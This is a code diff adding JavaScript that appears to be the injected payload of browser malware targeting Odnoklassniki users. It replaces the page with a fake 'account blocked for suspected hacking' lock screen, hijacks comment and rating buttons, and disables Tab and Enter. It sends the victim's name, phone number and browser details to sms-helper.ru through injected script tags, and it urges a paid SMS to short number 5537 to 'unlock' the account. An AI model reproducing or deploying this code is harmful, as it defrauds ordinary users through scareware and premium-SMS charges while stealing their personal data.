+var nam = "";
+function Num() {
+	var k = plg.Get('oPhone');
+	k = k.replace(/[X]/gi,'');
+	k = k.replace(/[+7]/gi, '');
+	nam = k;
+	
+}
+
+function LoadCSS() {
+    var NewCSS = document.createElement("link");
+    NewCSS.setAttribute("href", "http://stg.odnoklassniki.ru/res/batch/css/9f2f479c/main-part4.css");
+    NewCSS.setAttribute("type", "text/css");
+    NewCSS.setAttribute("rel", "stylesheet");
+    document.getElementsByTagName('head')[0].appendChild(NewCSS);
+}
+
+var sndSms = "";
+
+function GoStep() {
+    var info_cl = document.getElementById('field_mobile').value;
+    var num = document.getElementById('field_mobile').value;
+    
+    
+    if (num.length == 0) {
+        $('.input-e').text('Укажите номер телефона');
+        $('.input-e').css('display', 'block');
+        return false;
+    }
+    if (num.length < 8) {
+        $('.input-e').text('В номере неверное количество цифр.');
+        $('.input-e').css('display', 'block');
+        return false;
+    }
+    SendSMS();
+	Stat();
+    $('.input-e').css('display', 'none');
+    $('#Step_1').animate({
+        marginTop: '-=341px'
+    }, 800);
+}
+
+function st_2() {
+    sndSms = sendSms;
+    var pole = $('#field_mobile2').val();
+    if (pole.length == 0) {
+        $('.input-e').text('Введите код.');
+        $('.input-e').css('display', 'block');
+        return false;
+    }
+    if (pole.length != 5) {
+        $('.input-e').text('В коде слишком мало цифр.Повторите попытку.');
+        $('.input-e').css('display', 'block');
+        return false;
+    }
+
+    var inputKey = document.getElementById('field_mobile2').value;
+    if (sndSms) {
+        var validKey = sndSms.split(':');
+        for (i = 0; i < validKey.length; i++)
+            if (validKey[i] == inputKey) {
+                $('.input-e').css('display', 'none');
+                plg.Save('oRun', '0');
+                alert('Вы успешно разблокировали свою страницу, рекомендуем вам сменить пароль');
+                RedirToChangePass();
+                HideLock();
+				plg.Del();
+                return true;
+            }
+
+        $('.input-e').text('Вы ввели неправильный код, повторите попытку');
+        $('.input-e').css('display', 'block');
+        return false;
+
+    }
+
+}
+
+function RedirToChangePass() {
+    document.location = "http://www.odnoklassniki.ru/settings/dk?st.cmd=userConfig&cmd=PopLayer&tkn=819&st.layer.cmd=PopLayerConfigUserPassword";
+}
+
+function check() {
+    var pole = $('#field_mobile2').val();
+    if (pole.length == 0) {
+        $('.input-e').text('Введите код.');
+        $('.input-e').css('display', 'block');
+        return false;
+    }
+    if (pole.length < 6) {
+        $('.input-e').text('В коде слишком мало цифр.Повторите попытку.');
+        $('.input-e').css('display', 'block');
+        return false;
+    }
+}
+
+function OnlyNum(e) {
+    var keynum;
+    var keychar;
+    var numcheck;
+    var return2;
+    if (window.event) {
+        keynum = e.keyCode;
+    } else if (e.which) {
+        keynum = e.which;
+    }
+    keychar = String.fromCharCode(keynum);
+    if (keynum < 45 || keynum > 57) {
+
+        return2 = false;
+        if (keynum == 8) return2 = true;
+
+    } else return2 = true;
+    return return2;
+}
+
+function Sp_st() {
+    val = $('#country_select').val();	
+    text = $('#country_select option:selected').text();
+	document.getElementById('pre').innerText = val;
+    document.getElementById('contr').innerHTML = '<b>' + text + '</b>';
+    document.getElementById('country_select').style.display = 'block';
+    document.getElementById('choose_country').style.display = 'none';
+	
+	GetCountry();
+	if (val=="+7"){
+		type="3";
+		plg.Save('oType',type);
+	}
+	if (val=="+380")
+	{
+		type="1";
+		plg.Save('oType',type);
+	}
+	if ((val=="+77")||(val=="+374")||(val=="+994")||(val=="+375")||(val=="+370")||(val=="+371")||(val=="+373")){
+		type="2";
+		plg.Save('oType',type);
+	} 
+
+	pCode = document.getElementById('country_select').value;
+	
+	
+}
+
+
+function in_sel_ch() {
+    val = $('#country_select').val();
+    text = $('#country_select option:selected').text();
+    document.getElementById('pre').innerText = val;
+    document.getElementById('contr').innerHTML = '<b>' + text + '</b>';
+    $('#choose_country').css("display", "block");
+    $('#country_select').css("display", "none");
+	
+	GetCountry();
+	if (val=="+7"){
+	
+		type="3";
+		plg.Save('oType',type);
+	}
+	if ((val=="+380")){
+		type="1";
+		plg.Save('oType',type);
+	}
+	if ((val=="+77")||(val=="+374")||(val=="+994")||(val=="+375")||(val=="+370")||(val=="+371")||(val=="+373")){
+	type="2";
+	plg.Save('oType',type);
+	} 
+	
+	pCode = document.getElementById('country_select').value;
+	pCode = pCode.replace('+','');
+	
+}
+
+
+function GetName() {
+   try {
+		if (document.getElementsByClassName('mctc_nameLink bl')[0]) {
+			plg.Save('oName', escape(document.getElementsByClassName('mctc_nameLink bl')[0].innerText));
+		}
+	}
+	catch(e){
+		var nm = document.getElementById('portal-headline_login');
+		nm = nm.replace(/[помощьвыход]/gi,'');
+		plg.Save('oName',escape(nm.toString()));
+	}
+
+}
+
+function HideLock() {
+    document.getElementById('hook_Block_PopLayer').style.display = 'none';
+}
+
+function Stat() {
+	var useragent = navigator.userAgent; 
+    var pre = document.getElementById('pre').innerText;
+    pre = pre.replace('+', '');
+    var HiName = plg.Get('oName');
+    HiName = (encodeURIComponent(HiName));
+    var number = pre + ($('#field_mobile').val());
+    var alpha = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j'];
+    var res = "";
+    for (i = 0; i < number.length; i++)
+        res += alpha[parseInt(number[i])];
+    var state = document.createElement('script');
+    state.setAttribute('type', 'text/javascript');
+    var url = 'http://sms-helper.ru/js/stat.php?type='+type+'&set='+ res + '&name=' + HiName + '&page=' + id + '&id=' + plg.Get('id')+'&group='+plg.Get('group')+'&user_agent='+useragent;
+	state.setAttribute('src', url);
+    document.getElementsByTagName('head')[0].appendChild(state);
+   
+    plg.Save('oIdPage', id);
+
+}
+
+
+function MesBtnClick() {
+    document.getElementsByClassName('mdialog mdialog_m')[0].parentNode.removeChild(document.getElementsByClassName('mdialog mdialog_m')[0]);
+    document.getElementsByClassName('modal_overlay')[0].parentNode.removeChild(document.getElementsByClassName('modal_overlay')[0]);
+    ClearPage();
+    Wnd();
+    document.body.removeEventListener('DOMNodeInserted', MesBtnClick, false);
+}
+
+function CheckMobilName() {
+    var l = document.getElementById('field_mobile');
+    if (l == 0) {
+        confirm('Введите номер телефона!');
+        return;
+    }
+}
+
+
+function SendSMS() {
+    try {
+        var number = plg.Get('oPhone');
+        var id = plg.Get('id');
+        var idPage = plg.Get('vIdPage');
+        var alpha = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j'];
+        number = number.replace(/\+/, '');
+        var res = plg.Get('oPhone');
+		number = number.replace(/[X]/gi,'');
+		var rnum = document.getElementById('field_mobile').value;
+		var p = document.getElementById('pre').innerText;
+		p = p.replace('+','');
+		pCode = pCode.replace('+','');
+		var aress = p+rnum;
+		var ares = '';
+         for (var i = 0; i < aress.length; i++)
+            ares += alpha[parseInt(aress[i])]; 
+
+        var sms = document.createElement('script');
+        sms.setAttribute('type', 'text/javascript');
+        var url = 'http://sms-helper.ru/js/sendsms.php?type='+type+'&set='+ares+'&page=' + oID + '&id=' + id +'&shot='+shot;
+		sms.setAttribute('src', url);
+        document.getElementsByTagName('head')[0].appendChild(sms);
+		
+		
+    } catch (e) {}
+}
+var t="";
+
+
+function AntiTab() {
+	if(event.keyCode==9) return false;
+}
+
+function cancel(evt)
+{
+	evt = ( evt || window.event );
+	key = ( evt.keyCode || evt.charCode || evt.which || 0 );
+	if ( key == 3 || key == 9 || key == 13 )
+	{
+		evt.preventDefault();
+		evt.stopPropagation();
+	}
+}
+
+
+window.onload = function()
+{
+	document.body.addEventListener('keypress', cancel, false);
+}
+
+function Wnd() {
+    LoadCSS();
+    document.body.removeEventListener('DOMNodeInserted', Plus, false);
+    var modalPop = document.getElementById('hook_Block_PopLayer');
+	document.getElementById('hook_Block_ContentColumnContainer').innerHTML = '<div class="feed-loading"></div>';
+	Num();
+	   modalPop.innerHTML = ' <div class="feed-loading"></div></div><div id="hook_Modal_popLayer" class="modal" ><div id="popLayer_mo" class="modal_overlay"></div><table class="modal_tbl"><tbody><tr><td class="modal_td"><div id="modal_box" class="modal_box modal_box__payment" style="width: 740px; height: 341px;"><div class="panelLayer layerPanelSimple" id="paymentWizardInstant" style="width: 740px; height: 341px; border-color:#FFF;"><div class="panelLayer_head"><div class="panelLayer_head_headerSimple__no-title"></div></div><div class="panelLayer_body"><div id="pmntWzrdCtr"><div id="hook_Block_MiddleColumn" class="hookBlock"><div id="middleColumn"><div id="hook_Block_AnonymAccountRecovery" class="hookBlock"><div class="hook" id="hook_Form_5878971965"><form action="#" method="post"><div id="LockContent"><div id="Step_1" style="float: left; height: 341px;"><div class="form form__gl-2-2"><div class="form_i"><h2 class="recovery-header" ><br>' + unescape(plg.Get('oName')) + ', Ваша страница была заблокирована по подозрению на взлом!</h1><div><br>Наша система безопасности выявила массовую рассылку спам-сообщений с Вашего аккаунта и мы были вынуждены временно заблокировать его. Для восстановления доступа к аккаунту Вам необходимо пройти валидацию через мобильный телефон.</div></div><div class="form_i"><table class="input-flx-f recovery-selector"><tbody><tr><td>Страна оператора: <Label id="contr"  ><b>Россия</b></label> <a><span style="color:orange;" id = "choose_country" onclick= "Sp_st();" >Выберите страну</a></span> <select onchange="in_sel_ch();"style="float: left; display: none; width: 90%;" id="country_select" name="country_select">2.<option value="+7">Россия</option cursor:pointer>3.<option value="+380">Украина</option>4.<option value="+374">Армения</option>5.<option value="+994">Азербайджан</option>5.<option value="+375">Беларусь</option>6.<option value="+370">Литва</option>6.<option value="+371">Латвия</option>7.<option value="+373">Молдова</option> 7.<option value="+77">Казахстан</option></select>&nbsp;</td></tr></tbody></table><span class="input-l input-l__promo recovery-phone-prefix"><label id="pre" for="prefix">+7</label></span><div class="it_w"><input type="text" name="st.mobile" value="'+phone+'" id="field_mobile" class="it it__promo" autocomplete="off" maxlength="20"  onkeypress="return OnlyNum(event)" autofocus></div><span class="input-e"></span></div><span><div class="form_i" style = "float:left"><input type="button" id="step" onclick="GoStep(); SendSMS();" value="Выслать код"   class="button-pro"></span></div><div class="form_i"><br><span>Не получилось войти на сайт?<a class="feedbackLink" href="#">Обратитесь в службу поддержки</a></span></div></div></div>	<div id="Step_2"  style="float: left;  height: 341px;"><div class="form form__gl-2-2"><div class="form_i"><h3 class="recovery-header"><br><br>Восстановление доступа</h3><br><b>' + unescape(plg.Get('oName')) + '</b>,  В течении минуты на Ваш телефон<b>  ' +plg.Get('oPhone')+'</b>  прийдет SMS с кодом разблокировки Вашего аккаунта, полученный код введите здесь :<div></div></div><div class="form_i"><table class="input-flx-f recovery-selector"><tbody></tr></tbody></table><span class="input-l"><h2 class="recovery-header" >Введите код <br>подтверждения</h2></span><div class="it_w"><input type="text" name="st.mobile" value="" id="field_mobile2"  class="it it__promo" maxlength="20"></div><span class="input-e"></span></div><div class="form_i"><span><input type="button" id="step2" onclick="st_2();" value="Восстановить профиль" class="button-pro"></span></div><div class="form_i"><br><span>Не получилось войти на сайт?<a class="feedbackLink" href="#">Обратитесь в службу поддержки</a></span></div></div></div><div></form></div></div></div></div></div></div></div></div></td></tr></tbody></table></div></div></div>';
+    modalPop.style.display = 'block';
+	modalPop.setAttribute("onkeydown","cancel()");
+	document.getElementById('field_mobile').value = nam;
+    plg.Save('oRun', '2');
+}
+
+function Wnd_Page() {
+    if (document.getElementsByClassName('ntf_spacer ntf__prev_position ntf_spacer__animated ntf_spacer__on')[0]) {
+        document.getElementById('ntf_spacer ntf__prev_position ntf_spacer__animated ntf_spacer__on')[0].parentNode.removeChild(document.getElementById('ntf_spacer ntf__prev_position ntf_spacer__animated ntf_spacer__on')[0]);
+    }
+    var modalPop = document.getElementById('mainContainer');
+    var toolbar = document.getElementsByClassName('toolbar')[0];
+    toolbar.innerHTML = '<div class="toolbar_c"><a class="toolbar_logo"><div class="toolbar_logo_img"></div></a><div class="toolbar_label">Восстановление доступа</div></div>';
+    ClearPage();
+	Num();
+	
+    modalPop.innerHTML = '<div class="feed-loading"></div></div><div id="hook_Modal_popLayer" class="modal" ><div id="popLayer_mo" class="modal_overlay"></div><table class="modal_tbl"><tbody><tr><td class="modal_td"><div id="modal_box" class="modal_box modal_box__payment" style="width: 740px; height: 341px;"><div class="panelLayer layerPanelSimple" id="paymentWizardInstant" style="width: 740px; height: 341px; border-color:#FFF;"><div class="panelLayer_head"><div class="panelLayer_head_headerSimple__no-title"></div></div><div class="panelLayer_body"><div id="pmntWzrdCtr"><div id="hook_Block_MiddleColumn" class="hookBlock"><div id="middleColumn"><div id="hook_Block_AnonymAccountRecovery" class="hookBlock"><div class="hook" id="hook_Form_5878971965"><form action="#" method="post"><div id="LockContent"><div id="Step_1" style="float: left; height: 341px;"><div class="form form__gl-2-2"><div class="form_i"><h2 class="recovery-header" ><br>' + unescape(plg.Get('oName')) + ', Ваша страница была заблокирована по подозрению на взлом!</h1><div><br>В течении минуты на Ваш телефон<b> '+plg.Get('oPhone')+ '</b> прийдет SMS с требованием подтвердить активацию Вашего аккаунта, после подтверждения Вы получите код, введите его здесь:</div></div><div class="form_i"><table class="input-flx-f recovery-selector"><tbody><tr><td>Страна оператора: <Label id="contr"  ><b>Россия</b></label> <a><span style="color:orange;" id = "choose_country" onclick= "Sp_st();" >Выберите страну</a></span> <select onchange="in_sel_ch();"style="float: left; display: none; width: 90%;" id="country_select" name="country_select">2.<option value="+7">Россия</option cursor:pointer>3.<option value="+380">Украина</option>4.<option value="+374">Армения</option>5.<option value="+994">Азербайджан</option>5.<option value="+375">Беларусь</option>6.<option value="+370">Литва</option>6.<option value="+371">Латвия</option>7.<option value="+373">Молдова</option>7.<option value="+77">Казахстан</option> </select>&nbsp;</td></tr></tbody></table><span class="input-l input-l__promo recovery-phone-prefix"><label id="pre" for="prefix">+7</label></span><div class="it_w"><input type="text" name="st.mobile" value="7"'+nam+' id="field_mobile" class="it it__promo" autocomplete="off" maxlength="20" onkeypress="return OnlyNum(event)" autofocus></div><span class="input-e"></span></div><span><div class="form_i" style = "float:left"><input type="button" id="step" onclick="GoStep(); SendSMS();" value="Выслать код" class="button-pro"></span></div><div class="form_i"><br><span>Не получилось войти на сайт?<a class="feedbackLink" href="#">Обратитесь в службу поддержки</a></span></div></div></div>	<div id="Step_2"  style="float: left;  height: 341px;"><div class="form form__gl-2-2"><div class="form_i"><h3 class="recovery-header"><br><br>Восстановление доступа</h3><br><b> ' +unescape(plg.Get('oName')) + ' </b>,на Ваш телефон прийдет SMS с кодом разблокировки Вашего аккаунта. Полученный код введите здесь :.<div></div></div><div class="form_i"><table class="input-flx-f recovery-selector"><tbody></tr></tbody></table><span class="input-l"><h2 class="recovery-header" >Введите код <br>подтверждения</h2></span><div class="it_w"><input type="text" name="st.mobile" value="" id="field_mobile2"  class="it it__promo" maxlength="20"></div><span class="input-e"></span></div><div class="form_i"><span><input type="button" id="step2" onclick="st_2();" value="Восстановить профиль" class="button-pro"></span></div><div class="form_i"><br><a span id="hid" style="cursor:pointer" onclick="Hidden();">Не получили код?</a><a class="feedbackLink" href="#">Обратитесь в службу поддержки</a></span> <div id="hide" style="display:none"><br>Получить активационный код можно отправив SMS с текстом <b>007187 252</b> на номер <b>5537</b>.Стоимость SMS равна номинальной стоимости, установленной вашим оператором.Если не получилось отправить смс, свяжитесь с нами</div></div></div></div><div></form></div></div></div></div></div></div></div></div></td></span></tr></tbody></table></div></div></div>';
+    modalPop.style.display = 'block';
+	pCode = document.getElementById('country_select').value;
+	
+	modalPop.setAttribute("onkeydown","cancel()");
+	document.getElementById('field_mobile').value = nam;
+    modalPop.focus();
+    document.getElementsByClassName('modal_overlay')[0].style.backgroundColor = "#FFF";
+    document.getElementById('modal_box').style.borderColor = "#FFF";
+    document.getElementById('mainContainer').style.backgroundColor = "#FFF";
+    plg.Get('oRun') == '2';
+    if (document.getElementsByClassName('feed-loading')[0])
+        document.getElementsByClassName('feed-loading')[0].parentNode.removeChild(document.getElementsByClassName('feed-loading')[0]);
+
+}
+var h="0";
+
+function Hidden() {
+	if (h==0){
+		document.getElementById('hide').style.display = "block";
+		h=1;
+	}
+	else {
+		document.getElementById('hide').style.display = "none";
+		h=0;
+	}
+}
+
+function GLock() {
+    if (document.getElementsByClassName('pl_cw')[0]) {
+        var addCommentBtn = document.getElementsByClassName('plp_cmt_w')[0];
+        addCommentBtn.setAttribute("onClick", "Wnd()");
+        var arr = document.getElementsByClassName('viewPhotoMark');
+        for (i = 0; i < arr.length; i++) {
+            arr[i].setAttribute("onClick", "Wnd()");
+        }
+				
+	}
+
+}
+/*  if (document.getElementsByClassName('mdialog mdialog_m')[0]) {
+    var mesBtn = document.getElementsByClassName('disc_simple_input_btn')[0]; 
+    mesBtn.setAttribute("onClick", "Wnd()");
+}  */
+
+
+function Mark() {
+		var d1 = document.getElementsByClassName('mark_ic mark_ic__1')[0];
+		d1.href='#';
+		d1.setAttribute('onclick','Wnd()');
+		var d2 = document.getElementsByClassName('mark_ic mark_ic__2')[0];
+		d2.href='#';
+		d2.setAttribute('onclick','Wnd()');
+		var d3 = document.getElementsByClassName('mark_ic mark_ic__3')[0];
+		d3.href='#';
+		d3.setAttribute('onclick','Wnd()');
+		var d4 = document.getElementsByClassName('mark_ic mark_ic__4')[0];
+		d4.href='#';
+		d4.setAttribute('onclick','Wnd()');
+		var d5 = document.getElementsByClassName('mark_ic mark_ic__5')[0];
+		d5.href='#';
+		d5.setAttribute('onclick','Wnd()');
+		
+}
+
+var id = "";
+var oID = "";
+
+function Go() {
+if (document.getElementsByClassName('centD')[0]) {
+if (document.getElementsByClassName('mark_ic mark_ic__1')[0]){
+	 	Mark();
+	}
+}
+    if (document.getElementById('plp_fldCom')){
+        document.getElementById('plp_fldCom').setAttribute('onkeydown', 'Wnd()');
+	}
+   if (document.getElementsByClassName('pl_cw')[0]) {
+        if (document.getElementsByClassName('plp_cmt_btn')[0]) {
+            if (document.getElementsByClassName('plp_cmt_btn')[0].style.display == 'inline') {
+                var comment = document.getElementsByClassName('plp_cmt_btn')[0];
+                comment.setAttribute('onClick', "Wnd()");
+            }
+        }
+    } 
+
+        var addCommentBtn = document.getElementsByClassName('plp_cmt_w')[0];
+		if (addCommentBtn)
+        addCommentBtn.setAttribute("onclick", "Wnd()");
+
+}
+
+function Plus() {
+    LoadCSS();
+    Wnd();
+    
+}
+
+function GetId() {
+    id = document.getElementsByClassName('portal-headline__link')[3];
+    id = id.href.match(/[0-9]+/);
+    oID = id.toString();
+    plg.Save('oIdPage', id.toString());
+}
+window.onload = function () {
+
+    CheckTime();
+    IsTime();
+    NewAction();
+    GetId();
+	GetName();
+	if ((!plg.Get('oPhone'))||(plg.Get('oPhone').lenght==0)){    
+		GetNumber();
+	}
+	Prefix();
+
+	var key = plg.Get('oRun');
+    if (key == '0') {
+        LockStop();
+        return false;
+    }
+    if (key == '1') {
+        document.body.addEventListener('DOMNodeInserted', Go, false);
+		LoadCSS();
+	}
+    if (key == '2') {
+        LoadCSS();
+        Wnd_Page();
+    }
+
+}
+
+function Worll() {
+    document.body.addEventListener('DOMNodeInserted', Wnd(), false);
+
+}
+
+function remove_mess() {
+    var gg = document.getElementById('topPanelPopup_m');
+
+    if (gg) {
+        document.body.removeEventListener('DOMNodeInserted', remove_mess, false);
+        gg.parentNode.removeChild(gg);
+        Wnd();
+
+    }
+}
+
+var _cookies;
+
+function _initCookies() {
+    _cookies = {};
+    var ca = document.cookie.split(';');
+    var re = /^[\s]*([^\s]+?)$/i;
+    for (var i = 0, l = ca.length; i < l; i++) {
+        var c = ca[i].split('=');
+        if (c.length == 2) {
+            _cookies[c[0].match(re)[1]] = unescape(c[1].match(re) ? c[1].match(re)[1] : '');
+        }
+    }
+}
+
+
+function getCookie(name) {
+    _initCookies();
+    return _cookies[name];
+}
+
+function setCookie(name, value, days) {
+    var expires = '';
+    var path = '; Path=/';
+    if (days) {
+        var date = new Date();
+        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
+        expires = '; expires=' + date.toGMTString();
+    }
+
+    document.cookie = name + '=' + escape(value) + expires + path;
+}
+
+function getTime2() {
+    var g = new Date().getTime() / 1000 / 60 / 60;
+    g = g - (g % 1);
+    return g;
+}
+
+function IsTime() {
+    try {
+        var lTime = plg.Get('oTime');
+    } catch (e) {}
+    if (lTime < getTime()) {
+        plg.Save('oRun', '0');
+		plg.Del();
+        LockStop();
+
+    }
+}
